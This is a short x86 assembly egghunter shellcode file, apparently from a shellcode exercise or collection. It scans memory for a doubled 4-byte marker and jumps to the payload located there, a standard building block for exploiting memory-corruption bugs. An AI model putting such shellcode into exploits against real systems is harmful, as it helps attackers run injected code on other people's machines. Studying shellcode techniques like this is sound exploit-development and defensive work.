;Author:   evoche
;License:  GPL

global _start
 
section .text

_start:
        jmp short _call
 
_popMem:
        pop eax							;put valid address in eax as starting address to iterate through
 
_eggSearch:
        dec eax							;move through addresses
        cmp dword [eax], 0x90FCFD90     ;look for first egg ; pattern → NOP/STD/CLD/NOP
        jne _eggSearch					;loop if not found
        cmp dword [eax-4], 0x90FCFD90  	;look for second egg
        jne _eggSearch					;egg found - can now execute eax					
        jmp eax                         
 
_call:
        call _popMem


